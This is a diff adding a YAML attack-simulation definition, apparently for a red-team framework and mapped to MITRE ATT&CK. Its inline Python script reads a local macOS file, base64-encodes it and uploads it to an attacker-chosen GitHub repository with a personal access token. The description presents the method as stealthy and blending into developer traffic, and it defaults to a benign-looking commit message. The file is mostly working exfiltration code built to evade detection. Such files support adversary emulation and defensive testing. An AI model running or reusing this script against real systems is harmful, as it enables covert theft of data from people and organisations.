@@ -1,0 +1,108 @@
+---
+api_version: 2.0
+uuid: 0c1d68a2-7b9f-4e3d-8a1b-9f0c2d3e4f5a
+name: exfiltrate-file-to-github
+authors:
+  - godlovepenn
+description: |
+  Exfiltrates a local file from a macOS system by uploading it to a GitHub
+  repository using the GitHub API. This TTP uses a self-contained Python script
+  with only standard library modules (urllib, base64, json), which can be
+  stealthier than using common shell utilities like curl. The exfiltration
+  occurs over a standard HTTPS channel to api.github.com, blending in with
+  legitimate developer traffic.
+
+mitre:
+  tactics:
+    - "TA0010 Exfiltration"
+    - "TA0009 Collection"
+    - "TA0011 Command and Control"
+  techniques:
+    - "T1567 Exfiltration Over Web Service"
+    - "T1005 Data from Local System"
+    - "T1071 Application Layer Protocol"
+  subtechniques:
+    - "T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+    - "T1071.001 Application Layer Protocol: Web Protocols"
+
+requirements:
+  platforms:
+    - os: darwin
+  superuser: false
+
+args:
+  - name: local_file_path
+    description: "The full path to the local file to exfiltrate."
+    type: path
+    default: "archived-docs.tar.gz"
+  - name: github_pat
+    description: "A GitHub Personal Access Token (PAT) with 'repo' scope."
+    type: string
+    default: ""
+  - name: repo_owner
+    description: "The username or organization that owns the target repository."
+    type: string
+    default: "your-username"
+  - name: repo_name
+    description: "The name of the target GitHub repository."
+    type: string
+    default: "exfil-repo"
+  - name: remote_path
+    description: "The desired path and filename for the file within the repository."
+    type: string
+    default: "exfil/exfil_data.gz"
+  - name: commit_message
+    description: "A benign-looking commit message for the file upload."
+    type: string
+    default: "Update documentation"
+
+steps:
+  - name: exfiltrate_file_to_github
+    executor: python3
+    inline: |
+      import base64
+      import json
+      import urllib.request
+      import sys
+
+      local_file_path = "{{.Args.local_file_path}}"
+      github_pat = "{{.Args.github_pat}}"
+      repo_owner = "{{.Args.repo_owner}}"
+      repo_name = "{{.Args.repo_name}}"
+      remote_path = "{{.Args.remote_path}}"
+      commit_message = "{{.Args.commit_message}}"
+
+      try:
+          with open(local_file_path, "rb") as f:
+              file_content = f.read()
+          encoded_content = base64.b64encode(file_content).decode('utf-8')
+
+          api_url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{remote_path}"
+          data = {
+              "message": commit_message,
+              "content": encoded_content
+          }
+          json_data = json.dumps(data).encode('utf-8')
+
+          req = urllib.request.Request(api_url, data=json_data, method='PUT')
+          req.add_header("Accept", "application/vnd.github+json")
+          req.add_header("Authorization", f"Bearer {github_pat}")
+          req.add_header("X-GitHub-Api-Version", "2022-11-28")
+          req.add_header("Content-Type", "application/json; charset=utf-8")
+
+          with urllib.request.urlopen(req) as response:
+              print(f"File uploaded successfully. Status: {response.status}")
+              print(response.read().decode('utf-8'))
+
+      except FileNotFoundError:
+          print(f"Error: Local file not found at '{local_file_path}'", file=sys.stderr)
+          sys.exit(1)
+      except Exception as e:
+          error_body = ""
+          if hasattr(e, 'read'):
+              try:
+                  error_body = e.read().decode('utf-8')
+              except:
+                  pass
+          print(f"An error occurred: {e}\n{error_body}", file=sys.stderr)
+          sys.exit(1)
